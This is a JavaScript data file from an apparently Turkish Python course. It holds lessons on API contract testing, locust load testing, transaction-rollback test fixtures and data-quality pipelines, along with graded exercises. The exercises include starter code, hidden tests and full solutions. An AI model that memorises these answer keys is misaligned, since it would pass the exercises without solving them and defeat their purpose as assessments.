<p>Bir API'nin sözleşmesi OpenAPI belgesidir: hangi uç nokta, hangi alanlar, hangi türler, hangileri zorunlu. FastAPI bu belgeyi koddan üretir; ama istemciler (mobil uygulama, başka ekip) belgeye güvenir. İki tür sözleşme testi vardır:</p>
<div class="tbl-wrap"><table><tr><th>Yaklaşım</th><th>Nasıl?</th><th>Araç</th></tr>
<tr><td>Şemaya karşı test</td><td>Gerçek yanıtları OpenAPI şemasıyla doğrula; şemadan rastgele istekler üretip sunucuyu zorla</td><td>schemathesis, openapi-core</td></tr>
<tr><td>Tüketici güdümlü (consumer-driven)</td><td>Her istemci beklediği alanları bir sözleşme dosyasına yazar; sağlayıcı CI'da bu dosyalara karşı test edilir</td><td>Pact</td></tr>
<tr><td>Kırıcı değişiklik denetimi</td><td>Yeni şemayı eskisiyle karşılaştır; alan silme, tür değiştirme, yeni zorunlu alan = kırıcı</td><td>oasdiff, openapi-diff</td></tr></table></div>
<pre class="code">schemathesis run http://localhost:8000/openapi.json --checks all   # şemadan yüzlerce istek üretir</pre>
<h2>Yük testi: ne kadar dayanır?</h2>
<p>Yük testi (load test), gerçekçi eşzamanlı kullanıcı trafiği altında yanıt sürelerini ve hata oranını ölçer. Python dünyasında en yaygın araç <b>locust</b>'tır: kullanıcı davranışını Python sınıfı olarak yazarsın.</p>
<pre class="code"># locustfile.py   →   locust -f locustfile.py --host http://localhost:8000 -u 200 -r 20 -t 5m --headless
from locust import HttpUser, task, between

class Musteri(HttpUser):
    wait_time = between(1, 3)            # kullanıcılar arası düşünme süresi

    @task(5)                             # ağırlık: listeleme 5 kat sık
    def urunler(self):
        self.client.get("/urunler?sayfa=1")

    @task(1)
    def siparis(self):
        self.client.post("/siparisler", json={"urun_id": 7, "adet": 1})</pre>
<p>Ortalamaya değil <b>yüzdeliklere</b> bak: p95 = 480 ms, isteklerin %95'inin 480 ms'den kısa sürdüğünü söyler. Ortalama, birkaç çok yavaş isteği gizler; o yavaş istekler genellikle en çok sipariş veren müşterilerinkidir. Hedefleri SLO (hizmet düzeyi hedefi) olarak yaz: "p95 &lt; 500 ms, hata oranı &lt; %1, 200 eşzamanlı kullanıcıda". Yük testini prod'a değil, prod benzeri staging ortamına uygula.</p>
<div class="note"><b>Gerçek işte</b>Backend ekiplerinde tipik test dağılımı: çok sayıda hızlı birim testi, her depo ve sorgu için rollback fixture'lı entegrasyon testleri, CI'da sözleşme ve kırıcı değişiklik denetimi, büyük sürümlerden önce staging'de yük testi. Mülakatta "Entegrasyon testlerinde veritabanını nasıl izole ediyorsun?" sorusuna transaction rollback cevabı beklenir.</div>`,
    ex: [
      {
        t: 'mc',
        id: 'test-ileri-y1',
        stage: 'Isınma',
        q: 'Her entegrasyon testini bir transaction içinde çalıştırıp sonunda <code>ROLLBACK</code> yapmanın temel kazancı nedir?',
        o: [
          'Testler gerçek veritabanı yerine bellekte çalışır',
          'Her test temiz durumla başlar ve şemayı yeniden kurma maliyeti olmaz',
          'Test edilen kodun commit çağrıları hata verir ve böylece yakalanır',
          'Testler paralel çalışırken birbirinin verisini görebilir'
        ],
        a: 1,
        why: 'Rollback, testin yazdığı her şeyi milisaniyeler içinde geri alır; şemayı her testte kurmak ya da tabloları boşaltmak çok daha yavaştır. Kod commit çağırıyorsa savepoint ile dış transaction korunur. Testler hâlâ gerçek veritabanıyla çalışır.'
      },
      {
        t: 'mc',
        id: 'test-ileri-y2',
        stage: 'Isınma',
        q: 'Yük testinde ortalama yanıt süresi 120 ms, p99 ise 2.400 ms. Bu ne anlama gelir?',
        o: [
          'Sistem sağlıklı; ortalama hedefin altında',
          'İsteklerin %1\'i 2,4 saniyeden uzun sürüyor; kuyruk gecikmesi incelenmeli',
          'Ölçüm hatalı; p99 ortalamanın en fazla iki katı olabilir',
          'İsteklerin %99\'u 2,4 saniyeden uzun sürüyor ve sistem çökmek üzere'
        ],
        a: 1,
        why: 'p99, isteklerin %99\'unun bu sürenin altında kaldığını söyler; demek ki %1\'i 2,4 sn\'yi aşıyor. Ortalama bu kuyruğu gizler. Yavaş kuyruk genellikle kilit beklemesi, havuz tükenmesi ya da çöp toplama gibi sorunlara işaret eder.'
      },
      {
        t: 'predict',
        id: 'test-ileri-y3',
        stage: 'Kodu oku',
        q: 'Savepoint ve dış transaction: bu kod ne yazdırır?',
        o: ['2 0', '3 0', '2 2', '1 0'],
        a: 0,
        code: 'import sqlite3\nc = sqlite3.connect(":memory:", isolation_level=None)\nc.execute("CREATE TABLE t (x INTEGER)")\nc.execute("BEGIN")\nc.execute("INSERT INTO t VALUES (1)")\nc.execute("SAVEPOINT s")\nc.execute("INSERT INTO t VALUES (2)")\nc.execute("ROLLBACK TO s")\nc.execute("INSERT INTO t VALUES (3)")\nara = c.execute("SELECT COUNT(*) FROM t").fetchone()[0]\nc.execute("ROLLBACK")\nprint(ara, c.execute("SELECT COUNT(*) FROM t").fetchone()[0])\n',
        why: 'ROLLBACK TO s yalnız savepoint\'ten sonraki 2\'yi geri alır; ara noktada tabloda 1 ve 3 vardır. Dış ROLLBACK ise transaction içindeki her şeyi siler. Test fixture\'ı bu ikinci adımla her testi temiz bırakır.'
      },
      {
        t: 'order',
        id: 'test-ileri-y4',
        stage: 'Kodu oku',
        q: '<p>Testi transaction içinde çalıştırıp sonunda geri alan bağlam yöneticisini (fixture benzeri) ve kullanımını sırala. Beklenen çıktı:</p><pre class="out">içeride 1\ndışarıda 0</pre>',
        lines: [
          'import sqlite3',
          'from contextlib import contextmanager',
          'conn = sqlite3.connect(":memory:", isolation_level=None)',
          'conn.execute("CREATE TABLE musteri (ad TEXT)")',
          '@contextmanager',
          'def islem(c):',
          '    c.execute("BEGIN")',
          '    yield c',
          '    c.execute("ROLLBACK")'
        ],
        tests: 'with islem(conn) as c:\n    c.execute("INSERT INTO musteri VALUES (\'Ece\')")\n    print("içeride", c.execute("SELECT COUNT(*) FROM musteri").fetchone()[0])\nprint("dışarıda", conn.execute("SELECT COUNT(*) FROM musteri").fetchone()[0])\nassert conn.execute("SELECT COUNT(*) FROM musteri").fetchone()[0] == 0, "Rollback sonrası tablo boş olmalı"\n',
        hint: 'Dekoratör fonksiyonun hemen üstünde olmalı; BEGIN yield\'den önce, ROLLBACK sonra.',
        why: 'contextmanager, yield\'den önceki kısmı with bloğuna girerken, sonrasını çıkarken çalıştırır. Gerçek fixture\'da ROLLBACK\'i try/finally içine koyarsın ki test başarısız olsa bile geri alınsın.'
      },
      {
        t: 'code',
        id: 'test-ileri-y5',
        stage: 'Rehberli',
        diff: 2,
        needs: ['sqlite3'],
        q: '<p>Gerçek Anadolu Market verisiyle izole entegrasyon testi. <code>test_islemi(conn)</code> bağlam yöneticisini yaz: girişte <code>BEGIN</code> çalıştırıp bağlantıyı versin, çıkışta (hata olsa bile) <code>ROLLBACK</code> yapsın. Testler <code>veri.baglan("anadolu_market", tablolar=["products"])</code> ile açılan bağlantıda ürün fiyatlarını değiştirip geri alınmasını denetler.</p>',
        guide: ['@contextmanager ile bir üreteç fonksiyon yaz.', 'Bağlantıyı isolation_level=None yap ki BEGIN/ROLLBACK\'i sen yönet.', 'c.execute("BEGIN") sonra try: yield c, finally: c.execute("ROLLBACK").'],
        example: 'from contextlib import contextmanager\n\n@contextmanager\ndef zamanla(ad):\n    print(ad, "başladı")\n    try:\n        yield\n    finally:\n        print(ad, "bitti")\n\nwith zamanla("rapor"):\n    print("çalışıyor")\n',
        start: 'import veri\nfrom contextlib import contextmanager\n\n@contextmanager\ndef test_islemi(conn):\n    conn.isolation_level = None\n    # TODO: BEGIN\n    yield conn\n    # TODO: hata olsa bile ROLLBACK\n',
        sol: 'import veri\nfrom contextlib import contextmanager\n\n@contextmanager\ndef test_islemi(conn):\n    conn.isolation_level = None\n    conn.execute("BEGIN")\n    try:\n        yield conn\n    finally:\n        conn.execute("ROLLBACK")\n',
        tests: 'conn = veri.baglan("anadolu_market", tablolar=["products"])\nonce = conn.execute("SELECT ROUND(SUM(price), 2), COUNT(*) FROM products").fetchone()\nwith test_islemi(conn) as c:\n    c.execute("UPDATE products SET price = price * 2")\n    c.execute("DELETE FROM products WHERE category = \'Kitap\'")\n    ara = c.execute("SELECT COUNT(*) FROM products").fetchone()[0]\nassert ara < once[1], "Test içinde silme görünmeli"\nassert conn.execute("SELECT ROUND(SUM(price), 2), COUNT(*) FROM products").fetchone() == once, "Blok bitince fiyatlar ve silinen ürünler geri gelmeli"\ntry:\n    with test_islemi(conn) as c:\n        c.execute("DELETE FROM products")\n        raise AssertionError("test başarısız")\nexcept AssertionError:\n    pass\nassert conn.execute("SELECT COUNT(*) FROM products").fetchone()[0] == 40, "Başarısız testten sonra da 40 ürün geri gelmeli (finally)"\n',
        hints: ['Rollback hata durumunda da çalışmalı: try/finally.', 'yield\'den önce BEGIN, finally içinde ROLLBACK.', 'conn.execute("BEGIN"); try: yield conn; finally: conn.execute("ROLLBACK")'],
        why: 'Başarısız testler en çok kirli durum bırakanlardır; finally olmadan bir testin hatası, sonraki tüm testleri yanlış veriyle çalıştırır. pytest fixture\'ında yield sonrası kod zaten hata olsa da çalışır, ama bağlam yöneticisinde bunu sen garanti etmelisin.'
      },
      {
        t: 'code',
        id: 'test-ileri-y6',
        stage: 'Kendin yaz',
        diff: 2,
        q: '<p>Şemaya karşı sözleşme testi için küçük bir doğrulayıcı yaz: <code>sema_hatalari(deger, sema, yol="$")</code>, OpenAPI/JSON Schema\'nın şu alt kümesini desteklesin: <code>type</code> (<code>object</code>, <code>array</code>, <code>string</code>, <code>integer</code>, <code>number</code>, <code>boolean</code>), <code>nullable</code>, <code>required</code>, <code>properties</code>, <code>items</code>, <code>enum</code>. Hataları <code>"&lt;yol&gt;: &lt;neden&gt;"</code> listesi olarak döndür. Yollar <code>$.musteri.ad</code>, <code>$.kalemler[0].adet</code> biçiminde. Nedenler: <code>"tür"</code>, <code>"zorunlu"</code>, <code>"enum"</code>. Bir değerin türü yanlışsa onun alt alanlarına bakma. <code>integer</code> için bool kabul edilmez; <code>number</code> int\'i de kabul eder.</p>',
        start: 'def sema_hatalari(deger, sema, yol="$"):\n    return []\n',
        sol: 'TURLER = {"object": dict, "array": list, "string": str, "boolean": bool}\n\ndef _tur_uyar(v, t):\n    if t == "integer":\n        return isinstance(v, int) and not isinstance(v, bool)\n    if t == "number":\n        return isinstance(v, (int, float)) and not isinstance(v, bool)\n    return isinstance(v, TURLER[t])\n\ndef sema_hatalari(deger, sema, yol="$"):\n    if deger is None:\n        return [] if sema.get("nullable") else [f"{yol}: tür"]\n    if "type" in sema and not _tur_uyar(deger, sema["type"]):\n        return [f"{yol}: tür"]\n    hatalar = []\n    if "enum" in sema and deger not in sema["enum"]:\n        hatalar.append(f"{yol}: enum")\n    if isinstance(deger, dict):\n        for alan in sema.get("required", []):\n            if alan not in deger:\n                hatalar.append(f"{yol}.{alan}: zorunlu")\n        for alan, alt in sema.get("properties", {}).items():\n            if alan in deger:\n                hatalar += sema_hatalari(deger[alan], alt, f"{yol}.{alan}")\n    if isinstance(deger, list) and "items" in sema:\n        for i, eleman in enumerate(deger):\n            hatalar += sema_hatalari(eleman, sema["items"], f"{yol}[{i}]")\n    return hatalar\n',
        tests: 'SIPARIS = {"type": "object", "required": ["id", "durum", "kalemler"], "properties": {\n    "id": {"type": "integer"},\n    "durum": {"type": "string", "enum": ["hazirlaniyor", "kargoda", "teslim"]},\n    "not": {"type": "string", "nullable": True},\n    "musteri": {"type": "object", "required": ["ad"], "properties": {"ad": {"type": "string"}}},\n    "kalemler": {"type": "array", "items": {"type": "object", "required": ["urun_id", "adet"],\n                 "properties": {"urun_id": {"type": "integer"}, "adet": {"type": "integer"}, "fiyat": {"type": "number"}}}}}}\niyi = {"id": 910, "durum": "kargoda", "not": None, "musteri": {"ad": "Ece"}, "kalemler": [{"urun_id": 7, "adet": 2, "fiyat": 120}]}\nassert sema_hatalari(iyi, SIPARIS) == [], "Geçerli yanıt hata vermemeli (fiyat int de number sayılır, not null olabilir)"\nkotu = {"id": "910", "durum": "iptal", "musteri": {}, "kalemler": [{"urun_id": 7, "adet": True}, {"adet": 1}]}\nassert sema_hatalari(kotu, SIPARIS) == ["$.id: tür", "$.durum: enum", "$.musteri.ad: zorunlu", "$.kalemler[0].adet: tür", "$.kalemler[1].urun_id: zorunlu"], f"Gelen: {sema_hatalari(kotu, SIPARIS)}"\nassert sema_hatalari({"kalemler": "x"}, SIPARIS) == ["$.id: zorunlu", "$.durum: zorunlu", "$.kalemler: tür"], "Yanlış türün alt alanlarına bakılmaz"\nassert sema_hatalari(None, {"type": "string"}) == ["$: tür"], "nullable değilse None tür hatasıdır"\n',
        hints: [
          'Özyineleme: nesnede her özellik, dizide her eleman için aynı fonksiyonu yeni yol ile çağır.',
          'Önce None ve tür kontrolü; tür yanlışsa hemen dön.',
          'Sıra: enum, required (sırayla), properties (şemadaki sırayla), items.'
        ],
        why: 'schemathesis ve openapi-core gibi araçlar her yanıtı bu şekilde şemaya karşı denetler. API kodunda alanın adını ya da türünü değiştirdiğinde testler kırmızıya döner; istemciler bunu canlıda öğrenmez.'
      },
      {
        t: 'code',
        id: 'test-ileri-y7',
        stage: 'Kendin yaz',
        diff: 2,
        q: '<p>locust çıktısını özetle: <code>yuk_ozeti(kayitlar, sure_sn)</code> yaz. <code>kayitlar</code> <code>(uc_nokta, sure_ms, durum_kodu)</code> demetlerinden oluşur; <code>sure_sn</code> testin toplam süresidir. Her uç nokta için sözlük döndür: <code>istek</code> (sayı), <code>rps</code> (istek / saniye, 1 ondalık), <code>p50</code> ve <code>p95</code> (en yakın sıra yöntemi: sıralı listede <code>ceil(p/100 * n)</code>. eleman), <code>hata_orani</code> (500 ve üstü durum kodlarının oranı, 3 ondalık). Uç noktaları alfabetik sırala.</p>',
        start: 'import math\n\ndef yuk_ozeti(kayitlar, sure_sn):\n    return {}\n',
        sol: 'import math\n\ndef _yuzdelik(sirali, p):\n    return sirali[max(1, math.ceil(p / 100 * len(sirali))) - 1]\n\ndef yuk_ozeti(kayitlar, sure_sn):\n    gruplar = {}\n    for uc, ms, kod in kayitlar:\n        gruplar.setdefault(uc, []).append((ms, kod))\n    sonuc = {}\n    for uc in sorted(gruplar):\n        sureler = sorted(ms for ms, _ in gruplar[uc])\n        n = len(sureler)\n        hatali = sum(1 for _, kod in gruplar[uc] if kod >= 500)\n        sonuc[uc] = {"istek": n, "rps": round(n / sure_sn, 1), "p50": _yuzdelik(sureler, 50),\n                     "p95": _yuzdelik(sureler, 95), "hata_orani": round(hatali / n, 3)}\n    return sonuc\n',
        tests: 'import random\nrng = random.Random(42)\nK = [("/urunler", rng.randint(20, 200), 200) for _ in range(95)] + [("/urunler", 900 + i, 200) for i in range(5)]\nK += [("/siparis", 300, 201), ("/siparis", 350, 201), ("/siparis", 1200, 503), ("/siparis", 410, 201)]\no = yuk_ozeti(K, 10)\nassert list(o) == ["/siparis", "/urunler"], "Alfabetik sıra"\nu = o["/urunler"]\nassert u["istek"] == 100 and u["rps"] == 10.0, "100 istek / 10 sn = 10.0 rps"\nassert u["p95"] == sorted(x[1] for x in K if x[0] == "/urunler")[94], "p95: sıralı listenin 95. elemanı (indeks 94)"\nassert u["p95"] < 900, "En yavaş 5 istek p95\'in üstünde kalmalı"\nassert o["/siparis"] == {"istek": 4, "rps": 0.4, "p50": 350, "p95": 1200, "hata_orani": 0.25}, f"/siparis özeti: {o[\'/siparis\']}"\n',
        hints: ['Önce uç noktaya göre grupla, sonra her grubu ayrı işle.', 'En yakın sıra: indeks = ceil(p/100 * n) - 1 (en az 0).', '503 hata, 201 başarı sayılır: kod >= 500.'],
        why: 'Yük testi raporlarının dili budur: uç nokta başına RPS, yüzdelikler ve hata oranı. Ortalama yerine p95 kullanmak, yavaş kuyruğu (burada 900+ ms\'lik 5 istek) görünür kılar; SLO\'lar da bu sayılarla yazılır.'
      },
      {
        t: 'code',
        id: 'test-ileri-y8',
        stage: 'Hata avı',
        kind: 'bug',
        diff: 2,
        q: '<p>Hatayı bul ve düzelt. <code>yuzdelik(sureler, p)</code> en yakın sıra yöntemiyle p. yüzdeliği döndürmeli: sıralı listede <code>ceil(p/100 * n)</code>. eleman (1 tabanlı). Kod p=100\'de <code>IndexError</code> veriyor ve diğer değerlerde bir sonraki elemanı döndürüyor; ayrıca listeyi sıralamayı unutuyor.</p>',
        start: 'import math\n\ndef yuzdelik(sureler, p):\n    sira = int(p / 100 * len(sureler))\n    return sureler[sira]\n',
        sol: 'import math\n\ndef yuzdelik(sureler, p):\n    sirali = sorted(sureler)\n    sira = max(1, math.ceil(p / 100 * len(sirali)))\n    return sirali[sira - 1]\n',
        tests: 'S = [120, 80, 95, 300, 110, 90, 105, 2000, 100, 85]\nassert yuzdelik(S, 50) == 100, "10 elemanda p50 = 5. eleman (sıralı: 80,85,90,95,100,...)"\nassert yuzdelik(S, 90) == 300, "p90 = 9. eleman"\nassert yuzdelik(S, 100) == 2000, "p100 en büyük değerdir, IndexError değil"\nassert yuzdelik(S, 1) == 80, "p1 en küçük değer"\nassert yuzdelik([42], 95) == 42, "Tek elemanlı liste"\n',
        hints: ['Üç sorun: sıralama yok, sıra 1 tabanlı değil, int aşağı yuvarlar.', 'math.ceil ile yukarı yuvarla, 1 çıkararak indekse çevir.', 'p çok küçükse sıra 0 çıkabilir; max(1, ...) ile koru.'],
        why: 'Yüzdelik hesabındaki bir kaydırma hatası raporu sistematik olarak kötümser ya da iyimser yapar ve SLO kararlarını bozar. Sınır değerleri (p=100, tek eleman, p küçük) testlerin olmazsa olmazıdır.'
      },
      {
        t: 'code',
        id: 'test-ileri-y9',
        stage: 'Meydan okuma',
        diff: 3,
        q: '<p>Kırıcı değişiklik denetleyicisi (oasdiff benzeri): <code>kirici(eski, yeni, yon)</code> iki şemayı (önceki görevdeki alt küme) karşılaştırıp istemciyi kıracak değişiklikleri döndürsün. <code>yon</code> <code>"yanit"</code> ya da <code>"istek"</code>:</p><ul><li>Her iki yönde: aynı yolda <code>type</code> değişmişse <code>"&lt;yol&gt;: tür eski→yeni"</code> (alt alanlara inme).</li><li>Yanıtta: eskide olan bir özellik yenide yoksa <code>"&lt;yol&gt;: kaldırıldı"</code>; enum\'a yeni değer eklenmişse <code>"&lt;yol&gt;: enum genişledi"</code> (istemci tanımadığı değeri alır).</li><li>İstekte: yenide <code>required</code>\'a eklenmiş ama eskide zorunlu olmayan alan için <code>"&lt;yol&gt;: yeni zorunlu"</code>.</li></ul><p>Özellikler ve dizi elemanları (<code>items</code>, yol eki <code>[]</code>) için özyinele. Sonucu alfabetik sıralı liste döndür.</p>',
        start: 'def kirici(eski, yeni, yon, yol="$"):\n    return []\n',
        sol: 'def kirici(eski, yeni, yon, yol="$"):\n    sonuc = []\n    if eski.get("type") != yeni.get("type"):\n        return [f"{yol}: tür {eski.get(\'type\')}→{yeni.get(\'type\')}"]\n    if yon == "yanit" and "enum" in eski and set(yeni.get("enum", [])) - set(eski["enum"]):\n        sonuc.append(f"{yol}: enum genişledi")\n    if yon == "istek":\n        for alan in yeni.get("required", []):\n            if alan not in eski.get("required", []):\n                sonuc.append(f"{yol}.{alan}: yeni zorunlu")\n    e_ozl, y_ozl = eski.get("properties", {}), yeni.get("properties", {})\n    for alan, alt in e_ozl.items():\n        if alan not in y_ozl:\n            if yon == "yanit":\n                sonuc.append(f"{yol}.{alan}: kaldırıldı")\n        else:\n            sonuc += kirici(alt, y_ozl[alan], yon, f"{yol}.{alan}")\n    if "items" in eski and "items" in yeni:\n        sonuc += kirici(eski["items"], yeni["items"], yon, f"{yol}[]")\n    return sorted(sonuc)\n',
        tests: 'E = {"type": "object", "required": ["id"], "properties": {\n    "id": {"type": "integer"}, "tutar": {"type": "number"}, "durum": {"type": "string", "enum": ["a", "b"]},\n    "kupon": {"type": "string"},\n    "kalemler": {"type": "array", "items": {"type": "object", "properties": {"adet": {"type": "integer"}, "not": {"type": "string"}}}}}}\nY = {"type": "object", "required": ["id", "kupon"], "properties": {\n    "id": {"type": "string"}, "tutar": {"type": "number"}, "durum": {"type": "string", "enum": ["a", "b", "c"]},\n    "kupon": {"type": "string"}, "yeni_alan": {"type": "string"},\n    "kalemler": {"type": "array", "items": {"type": "object", "properties": {"adet": {"type": "integer"}}}}}}\nassert kirici(E, Y, "yanit") == ["$.durum: enum genişledi", "$.id: tür integer→string", "$.kalemler[].not: kaldırıldı"], f"Yanıt: {kirici(E, Y, \'yanit\')}"\nassert kirici(E, Y, "istek") == ["$.id: tür integer→string", "$.kupon: yeni zorunlu"], f"İstek: {kirici(E, Y, \'istek\')}"\nassert kirici(E, E, "yanit") == [] and kirici(E, E, "istek") == [], "Aynı şema kırıcı değildir"\n',
        hints: [
          'Tür farkı varsa hemen o yolu döndür; alt alanlara inmek anlamsız.',
          'Yanıtta silme ve enum genişlemesi, istekte yeni zorunlu alan kırıcıdır; yeni isteğe bağlı alan iki yönde de kırıcı değildir.',
          'Özellikler için kirici(alt_eski, alt_yeni, yon, yol + "." + alan), diziler için yol + "[]".'
        ],
        why: 'Kırıcı değişiklik kuralları yöne bağlıdır: yanıta alan eklemek güvenli, silmek kırıcıdır; isteğe isteğe bağlı alan eklemek güvenli, zorunlu alan eklemek kırıcıdır. Bu denetimi CI\'da çalıştırmak, sürüm numarası (major) gerektiren değişiklikleri otomatik işaretler.'
      }
    ],
    faq: [
      {
        q: 'Entegrasyon testinde SQLite mi, gerçek PostgreSQL mi?',
        a: 'Mümkünse prod ile aynı motor. SQLite hızlıdır ama tarih fonksiyonları, JSON, büyük/küçük harf duyarlılığı, kilitleme ve kısıt davranışlarında farklıdır; bu farklar tam da entegrasyon testinin yakalaması gereken hatalardır. testcontainers ya da CI\'daki services: postgres bunu kolaylaştırır.'
      },
      {
        q: 'Yük testini ne sıklıkla çalıştırmalıyım?',
        a: 'Her commit\'te değil. Büyük sürümlerden, altyapı değişikliklerinden ve beklenen trafik artışlarından (kampanya, Black Friday) önce staging\'de çalıştır; ayrıca kısa bir "duman yükü" testini gecelik CI\'a koyup p95\'in sürümler arasında kötüleşmesini izleyebilirsin.'
      }
    ]
  }
);
})(window);
/* Kesit Python — 'veri-boru-hatti' uzantısı (AUDIT 12, Derinleş + ek alıştırmalar) */
(function (W) {
'use strict';
const X = W.PY_EXT = W.PY_EXT || [];
X.push(
  {
    id: 'veri-boru-hatti',
    min: 30,
    needs: ['sqlite3'],
    html: `<p>Derste kalite kapılarını bir kontrol listesi olarak gördün. Bu bölüm onları uygulamaya döküyor: kalitenin boyutlarını ölçmek, kuralları koddan ayırıp bir <b>şemaya</b> yazmak, kötü satırları <b>karantinaya</b> almak, üretici ile tüketici arasındaki beklentiyi bir <b>veri sözleşmesine</b> bağlamak ve her çalıştırmanın sonunda okunabilir bir rapor üretmek. Örnekler gerçek kirli tablolarla: Anadolu Market'in <code>raw_signups</code> kayıt dökümü ve Power Query'den tanıdığın <code>kirli_veri</code> bayi raporu.</p>
<h2>Kalitenin boyutları</h2>
<div class="tbl-wrap"><table><tr><th>Boyut</th><th>Soru</th><th>raw_signups'ta örnek</th></tr>
<tr><td>Tamlık (completeness)</td><td>Zorunlu alanlar dolu mu?</td><td>10 satırda şehir boş</td></tr>
<tr><td>Tekillik (uniqueness)</td><td>Anahtar tekrar ediyor mu?</td><td>52 satır, 40 benzersiz <code>id</code></td></tr>
<tr><td>Geçerlilik (validity)</td><td>Değer biçime ve kurala uyuyor mu?</td><td>Tarih kimi satırda <code>29.07.2024</code>, kiminde <code>2024-02-10</code></td></tr>
<tr><td>Tutarlılık (consistency)</td><td>Aynı şey hep aynı mı yazılmış?</td><td><code>ISTANBUL</code>, <code>istanbul</code>, <code>İstanbul</code></td></tr>
<tr><td>Doğruluk (accuracy)</td><td>Değer gerçeği yansıtıyor mu?</td><td>Kaynakla mutabakat gerekir; tek başına ölçülemez</td></tr>
<tr><td>Tazelik (timeliness)</td><td>Veri yeterince güncel mi?</td><td>En yeni kayıt beklenen günden eski mi?</td></tr></table></div>
<p>Her boyutu bir orana çevirmek (ör. tamlık = zorunlu alanları dolu satır / tüm satırlar) kaliteyi zaman içinde izlenebilir kılar: "bu hafta tamlık %98'den %81'e düştü" demek, "veride sorun var" demekten çok daha işe yarar.</p>
<pre class="py">import veri, re
from collections import Counter
r = veri.kayitlar("anadolu_market", "raw_signups")
n = len(r)
tamlik = sum(x["city"] is not None for x in r) / n
tekillik = len({x["id"] for x in r}) / n
gecerlilik = sum(bool(re.fullmatch(r"\\d{4}-\\d{2}-\\d{2}", x["signup_date"])) for x in r) / n
yazimlar = Counter(x["city"] for x in r if x["city"])
print(f"satır={n} tamlık={tamlik:.1%} tekillik={tekillik:.1%} ISO tarih={gecerlilik:.1%}")
print("şehir yazımları:", len(yazimlar), sorted(yazimlar)[:4])</pre>
<h2>Kurallar koddan ayrı: şema</h2>
<p>Kuralları <code>if</code> yığınları olarak yazmak yerine bir şemada (schema) toplarsan hem okunur hem yeniden kullanılır. Python dünyasında bunun en yaygın aracı <b>pandera</b>'dır (pandas/polars DataFrame şeması); satır bazlı API girdisinde ise pydantic. Mantık aynı: sütun → tür + kurallar.</p>
<pre class="code">import pandera.pandas as pa   # pip install pandera
sema = pa.DataFrameSchema({
    "id":          pa.Column(int, unique=True),
    "email":       pa.Column(str, pa.Check.str_matches(r"^[^@\\s]+@[^@\\s]+\\.[a-z]+$")),
    "city":        pa.Column(str, pa.Check.isin(["İstanbul", "Ankara", "İzmir"]), nullable=False),
    "signup_date": pa.Column("datetime64[ns]"),
}, strict=True)                # şemada olmayan sütun gelirse hata
try:
    sema.validate(df, lazy=True)          # lazy: ilk hatada durma, hepsini topla
except pa.errors.SchemaErrors as e:
    print(e.failure_cases)                # hangi sütun, hangi kural, hangi değer</pre>
<div class="note"><b>Kendi bilgisayarında dene</b>pandera tarayıcıda yüklü değil. Aşağıdaki alıştırmalarda aynı fikri saf Python ile, sözlükten oluşan bir şemayla kuracaksın; böylece kütüphanenin içinde ne olduğunu da görmüş olacaksın.</div>
<h2>Karantina tablosu: ne at, ne durdur</h2>
<p>Kötü satırla ne yapmalı? Sessizce atmak veri kaybettirir ve kimse fark etmez; tüm partiyi durdurmak tek bir bozuk satır için bütün raporu bekletir. Orta yol <b>karantinadır</b> (quarantine): geçen satırlar hedefe, kalanlar ham hâliyle ve <b>neden</b> bilgisiyle ayrı bir tabloya yazılır. Veri sahibi karantinayı inceler, kaynağı düzeltir, satırlar yeniden işlenir. Karantina oranı eşiği aşarsa (ör. %5) parti yine durdurulur; bu, derste gördüğün hata kuyruğunun veritabanındaki karşılığıdır.</p>
<pre class="py">import sqlite3, json
c = sqlite3.connect(":memory:")
c.execute("CREATE TABLE karantina (parti TEXT, kayit TEXT, nedenler TEXT)")
bayi = veri.kayitlar("kirli_veri", "bayi")[2:]          # ilk iki satır başlık
for satir in bayi:
    nedenler = []
    if not satir["Column1"]:
        nedenler.append("bayi boş")
    if satir["Column4"] in (None, "-"):
        nedenler.append("tutar yok")
    if satir["Column3"] and not re.fullmatch(r"\\d{2}\\.\\d{2}\\.\\d{4}", satir["Column3"]):
        nedenler.append("tarih geçersiz")
    if nedenler:
        c.execute("INSERT INTO karantina VALUES (?, ?, ?)",
                  ("2024-01", json.dumps(satir, ensure_ascii=False), ", ".join(nedenler)))
for parti, nedenler in c.execute("SELECT parti, nedenler FROM karantina"):
    print(parti, "|", nedenler)</pre>
<h2>Veri sözleşmesi (data contract)</h2>
<p>Kaynak ekip bir gün sütun adını değiştirir ve senin boru hattın kırılır. Veri sözleşmesi, üretici ile tüketici arasında bu beklentileri yazıya döker: şema, kalite kuralları, tazelik taahhüdü (SLA), sahip ve iletişim. Çoğunlukla YAML'dır, git'te durur, değişiklikleri kod incelemesinden geçer ve CI'da otomatik denetlenir.</p>
<pre class="code"># contracts/raw_signups.yaml
dataset: anadolu_market.raw_signups
owner: crm-ekibi@anadolu.example
sla: {tazelik_saat: 24}
columns:
  - {name: id, type: int, required: true, unique: true}
  - {name: email, type: str, required: true, pattern: "^[^@ ]+@[^@ ]+$"}
  - {name: city, type: str, required: true, allowed: [İstanbul, Ankara, İzmir]}
  - {name: signup_date, type: str, required: true, pattern: "^\\\\d{4}-\\\\d{2}-\\\\d{2}$"}
quality:
  max_karantina_orani: 0.05</pre>
<p>Sözleşmeyi koda çevirmek, şema doğrulayıcını YAML'dan beslemek demektir: <code>yaml.safe_load</code> ile oku, her sütun tanımını bir kurala dönüştür, sonuçları bir rapora topla. Raporun sonunda tek bir karar olmalı: GEÇTİ ya da KALDI. Bu raporu JSON olarak saklamak, kalitenin zaman içindeki eğilimini panoda göstermeyi sağlar.</p>
<div class="warn"><b>Normalleştir, sonra doğrula</b><code>" Ankara"</code> ve <code>"izmir "</code> gibi değerler gerçekte geçerlidir; yalnız yazım bozuk. Doğrulamadan önce kırpma, büyük/küçük harf ve tarih biçimi gibi güvenli dönüşümleri yap; ama "anlamı tahmin eden" düzeltmeleri (boş şehri "İstanbul" saymak) asla otomatik yapma.</div>
<div class="note"><b>Gerçek işte</b>Veri ekiplerinde Great Expectations, Soda, dbt testleri ve pandera bu işi yapar; veri sözleşmeleri için açık standartlar (Open Data Contract Standard) da var. Hangisini kullanırsan kullan, mülakatta ve işte sorulan şey aynıdır: "Kötü veriyi nasıl yakalıyorsun, nereye koyuyorsun, kime haber veriyorsun?"</div>`,
    ex: [
      {
        t: 'mc',
        id: 'veri-boru-hatti-y1',
        stage: 'Isınma',
        q: '<code>kirli_veri.musteri</code> tablosunda 105 numaralı müşterinin kayıt tarihi <code>2024-02-30</code>. Bu hangi kalite boyutunun ihlalidir?',
